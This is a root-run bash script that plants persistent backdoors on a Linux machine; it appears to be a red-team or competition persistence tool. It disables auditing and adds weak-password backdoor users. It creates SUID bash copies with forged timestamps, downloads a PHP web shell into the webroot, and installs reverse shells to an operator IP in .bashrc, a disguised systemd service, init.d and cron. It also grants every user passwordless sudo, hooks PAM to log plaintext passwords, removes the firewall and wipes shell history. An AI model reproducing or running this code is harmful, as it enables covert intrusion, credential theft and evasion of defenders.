#!/bin/bash
#PORTS are 4444 1675 445 977
#Check for root privileges
if [[ $UID != 0 ]]; then
    echo "Please run this script with sudo:"
    echo "sudo $0 $*"
    exit 1
fi
echo "[*]Running as root, proceeding..."
echo "Enter IP: "
read IP
#encode shell in base64
OUTPUT=`echo  '/bin/bash -i >& /dev/tcp/'$IP'/4444 0>&1 &' | base64`
echo $OUTPUT
#to decode the shell base64 -d <<< $OUTPUT | sh
#block logging
echo "[*]Blocking logging..."
auditctl -e 0
#Add bad users
echo "[*]Adding user hack3r"
useradd -p $(openssl passwd -1 hack3r) hack3r
echo "[*]Adding user mharden"
useradd -p $(openssl passwd -1 password) mharden
echo "[*]Adding user pmalone"
useradd -p $(openssl passwd -1 rockstar) pmalone
#COPY bash shell
echo "[*]Copying bash shell to /etc/bind-old /usr/share/home and /home/.bash_lc"
cp /bin/bash /etc/bind-old
cp /bin/bash /usr/share/home
cp /bin/bash /home/.bash_lc
cp /bin/bash /bin/...
#ADD SUID bit for privesc
echo "[*]Adding SUID bit to backdoored bash shells..."
chmod u+s /etc/bind-old
chmod u+s /usr/share/home
chmod u+s /home/.bash_lc
#don't forget to use '-p' on the backdoored shell you stupid fuck
#Add Powny shell to webroot
$webroot=`grep -i 'DocumentRoot' /etc/apache2/sites-available/000-default.conf | sed 's/DocumentRoot //'`
curl -o $webroot/shell.php https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
#Change date of file creation to avoid forensics
echo "[*]Changing dates of bash shells..."
touch -t 200805130135 /etc/bind-old
touch -t 201204241142 /usr/share/home
touch -t 201606160812 /home/.bash_lc
#Reverse shell on login on bashrc
echo "[*]Reverse shell on login on /root/.bashrc..."
echo 'echo '$OUTPUT' | base64 -d | sh' >> ~/.bashrc
#`echo 'IHBpbmcgZ29vZ2xlLmNvbQo=' | base64 -d`
echo '/bin/bash -i >& /dev/tcp/'$IP'/1675 0>&1 &' >> ~/.bashrc
echo 'nc -e /bin/bash '$IP' 445 2>/dev/null &' >> ~/.bashrc
#Reverse shell on login fake service
echo "[*]Reverse shell on boot /etc/systemd/system/linuxdot.service"
echo '[Unit]
Description=System service for logging  of GFP links, part of the Linux Kernel.
[Service]
Type=simple
ExecStart=nc '$IP' 4444 -e /bin/bash &
[Install]
WantedBy=multi-user.target' >> /etc/systemd/system/linuxdot.service
touch -t 201512250100 /etc/systemd/system/linuxdot.service
systemctl enable linuxdot
service linuxdot enable
#Same but for initd
echo "[*]Reverse shell on boot /etc/init.d/stdout.sh"
echo '#!/bin/bash
/bin/bash -i >& /dev/tcp/'$IP'/977 0>&1 &'>> /etc/init.d/stdout.sh
chmod +x /etc/init.d/stdout.sh
update-rc.d stdout.sh defaults
touch -t 201504241142 /etc/init.d/stdout.sh
echo "[*]Allow all user to execute all commands with sudo"
#Allow all user to execute all commands with sudo
for user in `awk -F':' '{ print $1}' /etc/passwd` ; do
   echo ''"$user"'        ALL=(ALL)        NOPASSWD: ALL' >> /etc/sudoers
done
#TODO Establish ssh tunnel https://medium.com/@sec_for_safety/ssh-backdoor-how-to-get-a-proper-shell-on-the-victims-machine-52d28fe6dde1
#TODO poison the crontab
echo "useradd -p $(openssl passwd -1 adm1n) adm1n && usermod -aG sudo adm1n">/opt/1
chmod +x /opt/1
crontab -l > mycron
echo "* * * * * bash /opt/1" >> mycron
crontab mycron
rm mycron
#TODO PAM poisoning https://titanwolf.org/Network/Articles/Article?AID=5d66043f-b1fe-4d18-8f55-1b5dfc8b2fba
echo '#!/bin/sh
echo " $(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/secrets.log' > /usr/local/bin/paramiko
sudo touch /var/log/secrets.log
sudo chmod 770 /var/log/secrets.log
echo "auth optional pam_exec.so quiet expose_authtok /usr/local/bin/paramiko" >> /etc/pam.d/common-auth
sudo chmod 700 /usr/local/bin/paramiko
#TODO hack PAM to allow login without password
#Remove iptables and UFW, and block them from being reinstalled
echo "[*]Removing UFW/iptables and blocking their install"
apt-get remove iptables --purge -y
apt-get remove ufw --purge -y
echo 'Package: iptables
Pin: release *
Pin-Priority: -1'>/etc/apt/preferences.d/iptables
echo 'Package: ufw
Pin: release *
echo "[*]Clearing history..."
Pin-Priority: -1'>/etc/apt/preferences.d/ufw
#Clear history
cat /dev/null > ~/.bash_history && history -c && history -w
echo "[*]Done!"
#Delete self
#rm -- "$0"
